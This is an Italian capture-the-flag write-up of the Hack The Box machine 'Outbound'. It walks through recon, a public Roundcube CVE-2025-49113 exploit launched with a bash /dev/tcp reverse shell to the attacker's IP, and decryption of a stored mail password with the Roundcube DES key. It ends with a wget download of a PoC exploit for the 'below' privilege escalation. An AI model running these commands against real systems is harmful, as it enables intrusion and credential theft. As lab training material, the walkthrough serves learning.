# Macchina Outbound

IP vittima: 10.10.14.27 
IP attaccante: 10.10.11.77

**All'inizio vengono fornite delle credenziali per accedere al servizio fornito dal sito che è un client di posta elettronica:**
```
Username: tyler
Password: LhKL1o9Nm3X2
```
## Recon
`sudo nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.11.77`
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-07 18:41 CET
Nmap scan report for 10.10.11.77
Host is up (1.5s latency).
Not shown: 43832 closed tcp ports (reset), 21701 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 20.55 seconds
```

`sudo nmap -sC -sV -O -p22,80 10.10.11.77`
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-07 18:44 CET
Nmap scan report for outbound.htb (10.10.11.77)
Host is up (0.037s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://mail.outbound.htb/
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.8 (95%), Linux 5.0 - 5.4 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (94%), Linux 3.2 (94%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), HP P2000 G3 NAS device (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.85 seconds
```
## Sito html (Porta 80)
Per accedere agevolmente al sito occorre inserire nel file `/etc/hosts` questo riderimento:
`10.10.11.77 outbound.htb mail.outbound.htb`
![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%2020251107185049.png)
Accediamo con le credenziali fornite (Username: tyler - Password: LhKL1o9Nm3X2) e cliccando su `"?"` vediamo che si tratta della versione **1.6.10** del client **Roundcube**:
![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%2020251107185401.png)
## Foothold
La versione 1.6.10 di Roundcube è vulnerabile all'exploit `CVE-2025-49113`:
https://github.com/hakaioffsec/CVE-2025-49113-exploit
Per funzionare l'exploit ha bisogno delle credenziali di un utente che non già abbiamo.
- Scarichiamo l'exploit dalla repository (`CVE-2025-49113.php`) 
- Mettiamoci in ascolto sulla porta 4444 (`nc -lvnp 4444`)
- lanciamo l'exploit inserendo una reverseshell nel comando da eseguire:
`php CVE-2025-49113.php http://mail.outbound.htb/ tyler LhKL1o9Nm3X2 "bash -c 'bash -i >& /dev/tcp/10.10.14.27/4444 0>&1'"`
Riusciamo ad ottenere un accesso alla macchina vittima come utente `www-data`
## Movimento laterale
Analizzando `/etc/passwd` vediamo che ci sono 3 utenti:
```
tyler:x:1000:1000::/home/tyler:/bin/bash
jacob:x:1001:1001::/home/jacob:/bin/bash
mel:x:1002:1002::/home/mel:/bin/bash
```
Nella cartella `home` ci sono le 3 cartelle degli utenti a cui non possiamo accedere:
```
www-data@mail:/home$ ls -l
ls -l
total 20
drwxr-x--- 1 jacob jacob 4096 Jun  7 13:55 jacob
drwxr-x--- 1 mel   mel   4096 Jun  8 12:06 mel
drwxr-x--- 1 tyler tyler 4096 Jun  8 13:28 tyler
```
Diventiamo l'utente tyler avendo le sue credenziali (Username: tyler - Password: LhKL1o9Nm3X2) con `su tyler` 
Nella cartella di tyler c'è solo una cartella `mail` vuota.
### File di configurazione di Roundcube
Nella cartella `/var/www/html/roundcube/config` c'è il file di configurazione di Roundcube `config.inc.php`
Se lo esaminiamo troviamo queste informazioni:

`$config['db_dsnw'] = 'mysql://roundcube:RCDBPass2025@localhost/roundcube';`:
- Database Name: roundcube 
- Database User: roundcube 
- Database Password: RCDBPass2025 
- Database Host: localhost

```
// This key is used to encrypt the users imap password which is stored
// in the session record. For the default cipher method it must be
// exactly 24 characters long.
// YOUR KEY MUST BE DIFFERENT THAN THE SAMPLE VALUE FOR SECURITY REASONS
$config['des_key'] = 'rcmail-!24ByteDESkey*Str';
```
Questa riga di codice imposta una **"chiave master"** che Roundcube utilizza per proteggere (crittografare) la password della tua email prima di salvarla temporaneamente:
- Roundcube memorizza temporaneamente alcuni dati durante la tua sessione di navigazione
- Invece di salvare la tua password IMAP in chiaro (pericoloso!), la **cifra** usando questa chiave
- Quando serve la password, Roundcube la **decifra** temporaneamente in memoria
    
Spiegazione tecnica:
- **`des_key`** = chiave per la cifratura DES/3DES
- **`rcmail-!24ByteDESkey*Str`** = è la chiave per decifrare le password
- La password deve essere **esattamente 24 caratteri** per funzionare con l'algoritmo di cifratura

Accediamo alle sessioni del database Roundcube con il comando:
`mysql -u roundcube -pRCDBPass2025 -h localhost roundcube -e 'use roundcube;select * from session;' -E`
Otteniamo:
```
*************************** 1. row ***************************
sess_id: 3d0d06a96bbhu25gmthr5ohtpt
changed: 2025-11-07 19:14:23
     ip: 172.17.0.1
   vars: dGVtcHxiOjE7bGFuZ3VhZ2V8czo1OiJlbl9VUyI7dGFza3xzOjU6ImxvZ2luIjtza2luX2NvbmZpZ3xhOjc6e3M6MTc6InN1cHBvcnRlZF9sYXlvdXRzIjthOjE6e2k6MDtzOjEwOiJ3aWRlc2NyZWVuIjt9czoyMjoianF1ZXJ5X3VpX2NvbG9yc190aGVtZSI7czo5OiJib290c3RyYXAiO3M6MTg6ImVtYmVkX2Nzc19sb2NhdGlvbiI7czoxNzoiL3N0eWxlcy9lbWJlZC5jc3MiO3M6MTk6ImVkaXRvcl9jc3NfbG9jYXRpb24iO3M6MTc6Ii9zdHlsZXMvZW1iZWQuY3NzIjtzOjE3OiJkYXJrX21vZGVfc3VwcG9ydCI7YjoxO3M6MjY6Im1lZGlhX2Jyb3dzZXJfY3NzX2xvY2F0aW9uIjtzOjQ6Im5vbmUiO3M6MjE6ImFkZGl0aW9uYWxfbG9nb190eXBlcyI7YTozOntpOjA7czo0OiJkYXJrIjtpOjE7czo1OiJzbWFsbCI7aToyO3M6MTA6InNtYWxsLWRhcmsiO319cmVxdWVzdF90b2tlbnxzOjMyOiJZOVptb3BNSmdpdVpKUzFPZGEyVTNsREdyY3ZQaURnVyI7
*************************** 2. row ***************************
sess_id: 6a5ktqih5uca6lj8vrmgh9v0oh
changed: 2025-06-08 15:46:40
     ip: 172.17.0.1
   vars: bGFuZ3VhZ2V8czo1OiJlbl9VUyI7aW1hcF9uYW1lc3BhY2V8YTo0OntzOjg6InBlcnNvbmFsIjthOjE6e2k6MDthOjI6e2k6MDtzOjA6IiI7aToxO3M6MToiLyI7fX1zOjU6Im90aGVyIjtOO3M6Njoic2hhcmVkIjtOO3M6MTA6InByZWZpeF9vdXQiO3M6MDoiIjt9aW1hcF9kZWxpbWl0ZXJ8czoxOiIvIjtpbWFwX2xpc3RfY29uZnxhOjI6e2k6MDtOO2k6MTthOjA6e319dXNlcl9pZHxpOjE7dXNlcm5hbWV8czo1OiJqYWNvYiI7c3RvcmFnZV9ob3N0fHM6OToibG9jYWxob3N0IjtzdG9yYWdlX3BvcnR8aToxNDM7c3RvcmFnZV9zc2x8YjowO3Bhc3N3b3JkfHM6MzI6Ikw3UnYwMEE4VHV3SkFyNjdrSVR4eGNTZ25JazI1QW0vIjtsb2dpbl90aW1lfGk6MTc0OTM5NzExOTt0aW1lem9uZXxzOjEzOiJFdXJvcGUvTG9uZG9uIjtTVE9SQUdFX1NQRUNJQUwtVVNFfGI6MTthdXRoX3NlY3JldHxzOjI2OiJEcFlxdjZtYUk5SHhETDVHaGNDZDhKYVFRVyI7cmVxdWVzdF90b2tlbnxzOjMyOiJUSXNPYUFCQTF6SFNYWk9CcEg2dXA1WEZ5YXlOUkhhdyI7dGFza3xzOjQ6Im1haWwiO3NraW5fY29uZmlnfGE6Nzp7czoxNzoic3VwcG9ydGVkX2xheW91dHMiO2E6MTp7aTowO3M6MTA6IndpZGVzY3JlZW4iO31zOjIyOiJqcXVlcnlfdWlfY29sb3JzX3RoZW1lIjtzOjk6ImJvb3RzdHJhcCI7czoxODoiZW1iZWRfY3NzX2xvY2F0aW9uIjtzOjE3OiIvc3R5bGVzL2VtYmVkLmNzcyI7czoxOToiZWRpdG9yX2Nzc19sb2NhdGlvbiI7czoxNzoiL3N0eWxlcy9lbWJlZC5jc3MiO3M6MTc6ImRhcmtfbW9kZV9zdXBwb3J0IjtiOjE7czoyNjoibWVkaWFfYnJvd3Nlcl9jc3NfbG9jYXRpb24iO3M6NDoibm9uZSI7czoyMToiYWRkaXRpb25hbF9sb2dvX3R5cGVzIjthOjM6e2k6MDtzOjQ6ImRhcmsiO2k6MTtzOjU6InNtYWxsIjtpOjI7czoxMDoic21hbGwtZGFyayI7fX1pbWFwX2hvc3R8czo5OiJsb2NhbGhvc3QiO3BhZ2V8aToxO21ib3h8czo1OiJJTkJPWCI7c29ydF9jb2x8czowOiIiO3NvcnRfb3JkZXJ8czo0OiJERVNDIjtTVE9SQUdFX1RIUkVBRHxhOjM6e2k6MDtzOjEwOiJSRUZFUkVOQ0VTIjtpOjE7czo0OiJSRUZTIjtpOjI7czoxNDoiT1JERVJFRFNVQkpFQ1QiO31TVE9SQUdFX1FVT1RBfGI6MDtTVE9SQUdFX0xJU1QtRVhURU5ERUR8YjoxO2xpc3RfYXR0cmlifGE6Njp7czo0OiJuYW1lIjtzOjg6Im1lc3NhZ2VzIjtzOjI6ImlkIjtzOjExOiJtZXNzYWdlbGlzdCI7czo1OiJjbGFzcyI7czo0MjoibGlzdGluZyBtZXNzYWdlbGlzdCBzb3J0aGVhZGVyIGZpeGVkaGVhZGVyIjtzOjE1OiJhcmlhLWxhYmVsbGVkYnkiO3M6MjI6ImFyaWEtbGFiZWwtbWVzc2FnZWxpc3QiO3M6OToiZGF0YS1saXN0IjtzOjEyOiJtZXNzYWdlX2xpc3QiO3M6MTQ6ImRhdGEtbGFiZWwtbXNnIjtzOjE4OiJUaGUgbGlzdCBpcyBlbXB0eS4iO311bnNlZW5fY291bnR8YToyOntzOjU6IklOQk9YIjtpOjI7czo1OiJUcmFzaCI7aTowO31mb2xkZXJzfGE6MTp7czo1OiJJTkJPWCI7YToyOntzOjM6ImNudCI7aToyO3M6NjoibWF4dWlkIjtpOjM7fX1saXN0X21vZF9zZXF8czoyOiIxMCI7
*************************** 3. row ***************************
sess_id: hsrumvvgrttmlcpd7i084jrier
changed: 2025-11-07 19:14:22
     ip: 172.17.0.1
   vars: dGVtcHxiOjE7bGFuZ3VhZ2V8czo1OiJlbl9VUyI7dGFza3xzOjU6ImxvZ2luIjtza2luX2NvbmZpZ3xhOjc6e3M6MTc6InN1cHBvcnRlZF9sYXlvdXRzIjthOjE6e2k6MDtzOjEwOiJ3aWRlc2NyZWVuIjt9czoyMjoianF1ZXJ5X3VpX2NvbG9yc190aGVtZSI7czo5OiJib290c3RyYXAiO3M6MTg6ImVtYmVkX2Nzc19sb2NhdGlvbiI7czoxNzoiL3N0eWxlcy9lbWJlZC5jc3MiO3M6MTk6ImVkaXRvcl9jc3NfbG9jYXRpb24iO3M6MTc6Ii9zdHlsZXMvZW1iZWQuY3NzIjtzOjE3OiJkYXJrX21vZGVfc3VwcG9ydCI7YjoxO3M6MjY6Im1lZGlhX2Jyb3dzZXJfY3NzX2xvY2F0aW9uIjtzOjQ6Im5vbmUiO3M6MjE6ImFkZGl0aW9uYWxfbG9nb190eXBlcyI7YTozOntpOjA7czo0OiJkYXJrIjtpOjE7czo1OiJzbWFsbCI7aToyO3M6MTA6InNtYWxsLWRhcmsiO319cmVxdWVzdF90b2tlbnxzOjMyOiJ5RWx6bk5USXhaTW1jZW5mWXdXYkR6WGx1R2ExSFNhWSI7
*************************** 4. row ***************************
sess_id: ihjpp2ml8cf1s206si9blkdq9g
changed: 2025-11-07 19:14:23
     ip: 172.17.0.1
   vars: bGFuZ3VhZ2V8czo1OiJlbl9VUyI7aW1hcF9uYW1lc3BhY2V8YTo0OntzOjg6InBlcnNvbmFsIjthOjE6e2k6MDthOjI6e2k6MDtzOjA6IiI7aToxO3M6MToiLyI7fX1zOjU6Im90aGVyIjtOO3M6Njoic2hhcmVkIjtOO3M6MTA6InByZWZpeF9vdXQiO3M6MDoiIjt9aW1hcF9kZWxpbWl0ZXJ8czoxOiIvIjtpbWFwX2xpc3RfY29uZnxhOjI6e2k6MDtOO2k6MTthOjA6e319dXNlcl9pZHxpOjM7dXNlcm5hbWV8czo1OiJ0eWxlciI7c3RvcmFnZV9ob3N0fHM6OToibG9jYWxob3N0IjtzdG9yYWdlX3BvcnR8aToxNDM7c3RvcmFnZV9zc2x8YjowO3Bhc3N3b3JkfHM6MzI6Imo3MEJHTTJWRFJjRGN6b3ZZRHJYZlk3MmVGeGt4ck04Ijtsb2dpbl90aW1lfGk6MTc2MjU0Mjg2Mzt0aW1lem9uZXxzOjE3OiJBbWVyaWNhL1Nhb19QYXVsbyI7U1RPUkFHRV9TUEVDSUFMLVVTRXxiOjE7YXV0aF9zZWNyZXR8czoyNjoielA0WnBYcjZuRmt5c1VjUW9jQW5KTGhyMVIiO3JlcXVlc3RfdG9rZW58czozMjoiRXJDa1FqdkNWZ2VncHk2djlLV0oxZDY0WGU2VmdlbHoiOw==
```
Utilizzando il sito **CyberChef** (https://gchq.github.io/CyberChef/) decodificando da **Base64**
![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%2020251107203207.png)
Troviamo:
```
username|s:5:"jacob";
...
password|s:32:"L7Rv00A8TuwJAr67kITxxcSgnIk25Am/";
...
username|s:5:"tyler";
...
password|s:32:"j70BGM2VDRcDczovYDrXfY72eFxkxrM8";
```
### Utente jacob
Sempre con CyberChef tentiamo di decodificare la password:
- Decodifichiamo `L7Rv00A8TuwJAr67kITxxcSgnIk25Am/` da Base64 e trasformiamola in esadecimale:
![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%2020251107214818.png)
Otteniamo: `2f b4 6f d3 40 3c 4e ec 09 02 be bb 90 84 f1 c5 c4 a0 9c 89 36 e4 09 bf`
- Poi decrittiamo con **Triple DES Decrypt** con i seguenti parametri
  
		- **Key**:  `rcmail-!24ByteDESkey*Str` (UTF8)
  
		- **IV**: `2f b4 6f d3 40 3c 4e ec` (HEX) - primi 8 bit della password in esadecimale
  
		- **Input**: `09 02 be bb 90 84 f1 c5 c4 a0 9c 89 36 e4 09 bf` (HEX) - successivi 16 bit della password in esadecimale
![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%2020251107215310.png)
Otteniamo la password `595mO8DmwGeD` dell'utente `jacob`

Entriamo nella casella di jacob dal sito  con le credenziali trovate, nella inbox troviamo una mail che comunica una nuova password:
![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%2020251107220849.png)
Password: `gY4Wr3a1evp4`

Questa informazione possiamo ottenerla anche diventando l'utente jacob nel sistema con `su jacob` + password: `595mO8DmwGeD`, andando nella cartella `/home/jacob/mail/INBOX` e aprendo il file `jacob` che contiene le mail presenti nella inbox.
## ssh (porta 22)
Ora con le credenziali di jacob (username: `jacob` - password: `gY4Wr3a1evp4`) possiamo accedere al servizio ssh:
`ssh jacob@outbound.htb`
Nella cartella `/home/jacob` troviamo il file `user.txt` con la userflag.
## Scalata dei privilegi
Come utente jacob vediamo con `sudo -l` che l'utente può lanciare `/usr/bin/below` con privilegi root
```
jacob@outbound:~$ sudo -l
Matching Defaults entries for jacob on outbound:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jacob may run the following commands on outbound:
    (ALL : ALL) NOPASSWD: /usr/bin/below *, !/usr/bin/below --config*, !/usr/bin/below --debug*, !/usr/bin/below -d*
```
Il servizio `below` è vulnerabile all'exploit `CVE-2025-27591`
https://github.com/BridgerAlderson/CVE-2025-27591-PoC
- Scarichiamo la repository.
- Nella cartella che contiene il file `exploit.py` attiviamo un server python `python3 -m http.server 3000`.
- Sulla macchina vittima scarichiamo l'exploit con `wget http://10.10.14.27:3000/exploit.py`.
- Lanciamo l'exploit con `python3 exploit.py`

Diventiamo root. Nella cartella `/root` troviamo il file `root.txt` che contiene la rootflag.
